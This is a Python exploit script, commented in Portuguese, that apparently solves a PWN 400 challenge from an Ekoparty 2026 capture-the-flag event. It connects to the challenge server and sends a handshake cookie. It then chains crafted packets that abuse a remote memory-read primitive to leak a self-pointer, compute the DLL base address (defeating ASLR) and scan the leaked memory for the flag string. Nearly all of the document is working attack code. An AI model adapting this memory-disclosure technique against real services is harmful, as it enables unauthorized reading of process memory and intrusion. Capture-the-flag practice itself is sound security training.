#!/usr/bin/env python3
# Second Chall Gecko (PWN 400) — trilha LEAK (flag=1 = ReadProcessMemory(self, base+counter, data, len)).
# Objetivo: achar flag2 fora da imagem da DLL. counter = offset u32 a partir da base da DLL.
# 1 conexao por invocacao; encadeia os reads da LISTA (gate flag=1 fica aberto). Guard de banner.
# Reads arriscados (possivelmente nao-mapeados) por ULTIMO: o 1o que fechar mata o resto do chain.
import socket, struct, re, sys, time
HOST, PORT = "<IP>", 20269
COOKIE = b"Ekoparty 2026 - Binary Gecko CTF challenge"
HEALTHY = b"Welcome to this CTF\x00"
HIK = re.compile(rb'HIK_[\x20-\x7e]{4,300}')

# lista default: sanity + self-ptr (base atual) + borda + sonda logo apos a imagem
PROBES = [(0xd020,0x40),(0xd068,0x10),(0x12ff0,0x10),(0x13000,0x40),(0x14000,0x40),(0x20000,0x40)]

def rd(s,n,to=8.0):
    s.settimeout(to); b=b""
    try:
        while len(b)<n:
            c=s.recv(n-len(b))
            if not c: break
            b+=c
    except (socket.timeout,ConnectionResetError,OSError): pass
    return b

def main(cooldown):
    if cooldown>0:
        print(f"[*] cooldown {cooldown}s..."); time.sleep(cooldown)
    try:
        s=socket.create_connection((HOST,PORT),timeout=8); s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
    except Exception as e: print("CONNECT FAIL:",e); return
    s.sendall(COOKIE)
    banner=rd(s,20)
    print("banner:",banner.hex(), "OK" if banner==HEALTHY else "<<DEGRADADO/retry>>")
    if banner!=HEALTHY: s.close(); return
    base=None
    for counter,length in PROBES:
        s.sendall(struct.pack("<IBII",0xd,1,counter,length))
        r=rd(s,length)
        asc=''.join(chr(x) if 32<=x<127 else '.' for x in r)
        print(f"  counter=0x{counter:x} len=0x{length:x} -> {len(r)}B {r.hex()[:48]} | {asc[:40]}")
        if len(r)==0:
            print(f"    >>> FECHOU em counter=0x{counter:x} (nao-mapeado). chain morto."); break
        if counter==0xd068 and len(r)>=8:
            p=struct.unpack("<Q",r[:8])[0]; base=p-0xd020
            print(f"    >>> self-ptr=0x{p:x} => base_DLL atual=0x{base:x}")
        m=HIK.search(r)
        if m: print(f"    >>> HIK: {m.group().decode(errors='replace')}")
    s.close()

if __name__=="__main__":
    cd=int(sys.argv[1]) if len(sys.argv)>1 else 75
    main(cd)
